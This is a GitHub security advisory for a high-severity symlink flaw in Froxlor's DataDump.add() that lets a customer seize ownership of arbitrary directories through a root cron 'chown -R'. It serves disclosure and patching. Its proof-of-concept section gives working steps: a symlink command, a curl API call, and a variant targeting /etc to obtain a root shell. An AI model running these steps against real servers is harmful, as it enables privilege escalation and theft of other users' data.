# [H] Froxlor has Incomplete Symlink Validation in DataDump.add() Allows Arbitrary Directory Ownership Takeover via Cron

## Summary
Severity: High
Advisory: GHSA-75h4-c557-j89r
CVE: CVE-2026-41231
CWE: CWE-59
Ecosystem: Packagist
CVSS: CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:U/C:H/I:H/A:H (CVSS_V3)
Published: 2026-04-16
Source: https://github.com/advisories/GHSA-75h4-c557-j89r
Type: github-advisory

## Affected
- Packagist: `froxlor/froxlor` — affected >=0 <2.3.6

## Details
## Summary

`DataDump.add()` constructs the export destination path from user-supplied input without passing the `$fixed_homedir` parameter to `FileDir::makeCorrectDir()`, bypassing the symlink validation that was added to all other customer-facing path operations (likely as the fix for CVE-2023-6069). When the ExportCron runs as root, it executes `chown -R` on the resolved symlink target, allowing a customer to take ownership of arbitrary directories on the system.

## Details

The vulnerability is an incomplete patch. After CVE-2023-6069, symlink validation was added to `FileDir::makeCorrectDir()` via a `$fixed_homedir` parameter. When provided, it walks each path component checking for symlinks that escape the customer's home directory (lines 134-157 of `lib/Froxlor/FileDir.php`).

Every customer-facing API command that builds a path from user input passes this parameter:

```php
// DirProtections.php:87
$path = FileDir::makeCorrectDir($customer['documentroot'] . '/' . $path, $customer['documentroot']);

// DirOptions.php:96
$path = FileDir::makeCorrectDir($customer['documentroot'] . '/' . $path, $customer['documentroot']);

// Ftps.php:178
$path = FileDir::makeCorrectDir($customer['documentroot'] . '/' . $path, $customer['documentroot']);

// SubDomains.php:585
return FileDir::makeCorrectDir($customer['documentroot'] . '/' . $path, $customer['documentroot']);
```

But `DataDump.add()` was missed:

```php
// DataDump.php:88 — NO $fixed_homedir parameter
$path = FileDir::makeCorrectDir($customer['documentroot'] . '/' . $path);
```

The path flows unvalidated into a cron task (`lib/Froxlor/Api/Commands/DataDump.php:133`):

```php
Cronjob::inserttask(TaskId::CREATE_CUSTOMER_DATADUMP, $task_data);
```

When `ExportCron::handle()` runs as root, it executes at `lib/Froxlor/Cron/System/ExportCron.php:232`:

```php
FileDir::safe_exec('chown -R ' . (int)$data['uid'] . ':' . (int)$data['gid'] . ' ' . escapeshellarg($data['destdir']));
```

The `chown -R` command follows symlinks in its target argument. If `$data['destdir']` resolves through a symlink to an arbitrary directory, the attacker's UID/GID is applied recursively to that directory and all its contents.

The `Validate::validate()` call on line 86 uses an empty pattern, which falls back to `/^[^\r\n\t\f\0]*$/D` — this only strips control characters and does not prevent symlink names. `makeSecurePath()` strips shell metacharacters and `..` traversal but does not check for symlinks.

## PoC

Prerequisites:
- `system.exportenabled` = 1 (admin setting)
- Customer account with API key and FTP/SSH access

```bash
# Step 1: Create a symlink inside the customer's docroot pointing to a victim directory
# (customer has FTP/SSH access to their own docroot)
ssh customer@server 'ln -s /var/customers/webs/victim_customer /var/customers/webs/attacker_customer/steal'

# Step 2: Schedule data export via API with path pointing to the symlink
curl -X POST \
  -H "Content-Type: application/json" \
  -d '{"header":{"apikey":"CUSTOMER_API_KEY","secret":"CUSTOMER_API_SECRET"},"body":{"command":"DataDump.add","params":{"path":"steal","dump_web":"1"}}}' \
  https://panel.example.com/api.php

# Expected response: 200 OK with task_data including destdir

# Step 3: Wait for ExportCron to run (hourly cron as root)
# The cron executes:
#   mkdir -p '/var/customers/webs/attacker_customer/steal/'       (follows symlink, dir exists)
#   tar cfz ... -C /var/customers/webs/attacker_customer/ .       (tars attacker's web data)
#   chown -R <attacker_uid>:<attacker_gid> '/var/customers/webs/attacker_customer/steal/.tmp/'
#   mv export.tar.gz '/var/customers/webs/attacker_customer/steal/'
#   chown -R <attacker_uid>:<attacker_gid> '/var/customers/webs/attacker_customer/steal/'
#
# The final chown resolves the symlink and recursively chowns
# /var/customers/webs/victim_customer/ to the attacker's UID/GID.

# Step 4: Attacker now owns all of victim's web files
ssh customer@server 'ls -la /var/customers/webs/victim_customer/'
# All files now owned by attacker_customer UID

# For system-level escalation, the symlink can target /etc:
# ln -s /etc /var/customers/webs/attacker_customer/steal
# After cron: attacker owns /etc/passwd, /etc/shadow → root shell
```

## Impact

- **Horizontal privilege escalation:** A customer can take ownership of any other customer's web files, databases exports, and email data on the same server.
- **Vertical privilege escalation:** By targeting system directories (e.g., `/etc`), the customer can gain read/write access to `/etc/passwd` and `/etc/shadow`, enabling creation of a root account or password modification.
- **Data breach:** Full read access to all files in the targeted directory tree, including configuration files with database credentials, application secrets, and user data.
- **Service disruption:** Changing ownership of system directories can break system services.

The attack requires only a single API call and a symlink. The impact is delayed until the next cron run (typically hourly), making it harder to attribute.

## Recommended Fix

Pass `$customer['documentroot']` as the `$fixed_homedir` parameter in `DataDump.add()`, consistent with every other API command:

```php
// lib/Froxlor/Api/Commands/DataDump.php, line 88
// Before (vulnerable):
$path = FileDir::makeCorrectDir($customer['documentroot'] . '/' . $path);

// After (fixed):
$path = FileDir::makeCorrectDir($customer['documentroot'] . '/' . $path, $customer['documentroot']);
```

Additionally, the `ExportCron` should use `chown -h` (no-dereference) or validate the destination path is not a symlink before executing `chown -R`:

```php
// lib/Froxlor/Cron/System/ExportCron.php, line 232
// Add symlink check before chown
if (is_link(rtrim($data['destdir'], '/'))) {
    $cronlog->logAction(FroxlorLogger::CRON_ACTION, LOG_ERR, 'Export destination is a symlink, skipping chown for security: ' . $data['destdir']);
} else {
    FileDir::safe_exec('chown -R ' . (int)$data['uid'] . ':' . (int)$data['gid'] . ' ' . escapeshellarg($data['destdir']));
}
```

## References
- https://github.com/froxlor/froxlor/security/advisories/GHSA-75h4-c557-j89r
- https://nvd.nist.gov/vuln/detail/CVE-2026-41231
- https://github.com/froxlor/froxlor/commit/2987b0e8806ef12b532410050ad76d13d673a87d
- https://github.com/froxlor/froxlor
- https://github.com/froxlor/froxlor/releases/tag/2.3.6
